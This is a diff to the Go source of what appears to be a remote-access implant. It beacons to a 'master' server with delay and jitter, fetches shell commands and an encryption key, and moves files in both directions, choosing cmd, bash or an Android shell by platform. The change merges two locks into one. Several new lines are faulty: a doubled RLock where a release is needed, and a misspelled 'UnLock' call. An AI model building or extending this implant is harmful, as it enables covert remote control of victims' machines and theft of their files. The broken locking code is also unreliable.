@@ -562,10 +562,9 @@ func send() { //发送头部信息
         version string
         clientname string
         delay int = 30
-        delayMutex sync.RWMutex
         waitTime int = 3
         jitter int = 5
-        jitterMutex sync.RWMutex
+        a_Mutex sync.RWMutex
         base_rounds string = "/*base_rounds*/"
         decodeMap  = make(map[byte]int)
         onece bool = true
@@ -665,7 +664,7 @@ func send() { //发送头部信息
 		retryCount := 0
         for {
             var maxRetry int
-            delayMutex.RLock();if delay < 30 {maxRetry = 30} else {maxRetry = delay};delayMutex.RUnlock()
+            a_Mutex.RLock();if delay < 30 {maxRetry = 30} else {maxRetry = delay};a_Mutex.RUnlock()
             response, err := http.Get(url)
             if err != nil {
                 retryCount++
@@ -689,7 +688,7 @@ func send() { //发送头部信息
                 break
             }
             fullData = append(fullData, fileData...)
-            delayMutex.RLock();time.Sleep(time.Duration(delay) * time.Second);delayMutex.RUnlock()
+            a_Mutex.RLock();time.Sleep(time.Duration(delay) * time.Second);a_Mutex.RUnlock()
         }
         if err := get_decry_f(filename, fullData); err != nil {
             return
@@ -701,7 +700,7 @@ func send() { //发送头部信息
 	    fileSize := len(fileContent)
 	    start := 0
 	    var maxRetry int
-	    delayMutex.RLock();if delay < 30 {maxRetry = 30} else {maxRetry = delay};delayMutex.RUnlock()
+	    a_Mutex.RLock();if delay < 30 {maxRetry = 30} else {maxRetry = delay};a_Mutex.RUnlock()
 	    end := intSize
 	    for start < fileSize {
 	        if end > fileSize {
@@ -739,7 +738,7 @@ func send() { //发送头部信息
 	        }
 	        start = end
 	        end = start + intSize
-	        delayMutex.RLock();time.Sleep(time.Duration(delay) * time.Second);delayMutex.RUnlock()
+	        a_Mutex.RLock();time.Sleep(time.Duration(delay) * time.Second);a_Mutex.RUnlock()
 	    }
 	}
     func getCmd() {
@@ -749,14 +748,12 @@ func send() { //发送头部信息
         var job, shell string
         var msg []string
         for {
-            delayMutex.RLock()
+            a_Mutex.RLock()
             wait := delay
             if delay > 30 {
-                jitterMutex.RLock()
                 wait += rand.Intn(jitter + 1)
-                jitterMutex.RUnlock()
             }
-            delayMutex.RUnlock()
+            a_Mutex.RUnlock()
             time.Sleep(time.Duration(wait) * time.Second)
             respBody := getUrl(url)
             if respBody == "" {
@@ -884,15 +881,15 @@ func send() { //发送头部信息
         if err != nil || parsedJitter <= 0 {
             return
         }
-        jitterMutex.Lock();jitter = parsedJitter;jitterMutex.Unlock()
+        a_Mutex.Lock();jitter = parsedJitter;a_Mutex.Unlock()
     }
     func GET_DELAY(s_delay string) {
         parsedTime, err := strconv.ParseInt(s_delay, 10, strconv.IntSize)
         if err != nil || parsedTime <= 0{
             return
         }
-        delayMutex.Lock()
-        defer delayMutex.Unlock()
+        a_Mutex.Lock()
+        defer a_Mutex.Unlock()
         delay = int(parsedTime)
         /*prototime*/
         return
@@ -1109,7 +1106,9 @@ func send() { //发送头部信息
         )
         out := make([]byte, 0, len(s))
         for i := 0; i < len(s); i++ {
+			a_Mutex.RLock()
             v, ok := decodeMap[s[i]]
+			a_Mutex.RLock()
             if !ok {
                 continue
             }
@@ -1256,14 +1255,12 @@ func send() { //发送头部信息
         key = "null"
         get_keyUrl := protocol + master + "//*Path*/?/*option*/=/*encry_key*/&/*uid*/=" + uid
         for {
-            delayMutex.RLock()
+            a_Mutex.RLock()
             wait := int(delay)
             if delay > 30 {
-                jitterMutex.RLock()
                 wait += rand.Intn(jitter + 1)
-                jitterMutex.RUnlock()
             }
-            delayMutex.RUnlock()
+            a_Mutex.RUnlock()
             time.Sleep(time.Duration(wait) * time.Second)
             base_key_str := getUrl(get_keyUrl)
             decode_key_str := customBase64Decode(base_key_str)
@@ -1280,7 +1277,7 @@ func send() { //发送头部信息
     func run() {
         if onece {
             rand.Seed(time.Now().UnixNano())
-            decodeMap = buildDecodeMap()
+            a_Mutex.Lock();decodeMap = buildDecodeMap();a_Mutex.UnLock()
             if uid == "" {uid = generateUUID()}
             initHttpClient()
             if osname == "win"{version = "cmd"}else if osname == "linux" || osname == "macos"{version = "bash"}else if osname == "android"{version="/system/bin/sh"}
